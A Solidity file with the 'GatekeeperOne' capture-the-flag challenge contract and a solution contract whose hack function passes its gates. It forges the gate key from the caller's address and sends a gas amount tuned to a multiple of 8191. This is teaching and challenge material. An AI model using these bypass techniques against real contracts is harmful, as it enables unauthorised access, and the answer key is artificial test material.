// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Question 13
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0); // gas cost is 423. so, gasleft() == totalGas - 423
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract Solution13 {
    function hack(
        address _target,
        uint256 _fold,
        uint256 _gasUsed
    ) public {
        bytes8 gateKey = genGateKey();
        require(
            GatekeeperOne(_target).enter{gas: calcuGas(_fold, _gasUsed)}(
                gateKey
            ),
            "Hack fails"
        );
    }

    function genGateKey() public view returns (bytes8 gateKey) {
        // _gateKey: 0~32                              32~64
        //           the last 2 bytes of msg.sender   any content excluding zero
        gateKey = bytes8(uint64(uint16(uint160(msg.sender))) + (1 << 32));

        require(
            uint32(uint64(gateKey)) == uint16(uint64(gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(gateKey)) != uint64(gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(gateKey)) == uint16(uint160(msg.sender)),
            "GatekeeperOne: invalid gateThree part three"
        );
    }

    function calcuGas(uint256 _fold, uint256 _gasUsed)
        public
        pure
        returns (uint256)
    {
        if (_gasUsed == 0) {
            _gasUsed = 423; // for solc 0.8.15
        }
        return 8191 * _fold + _gasUsed;
    }
}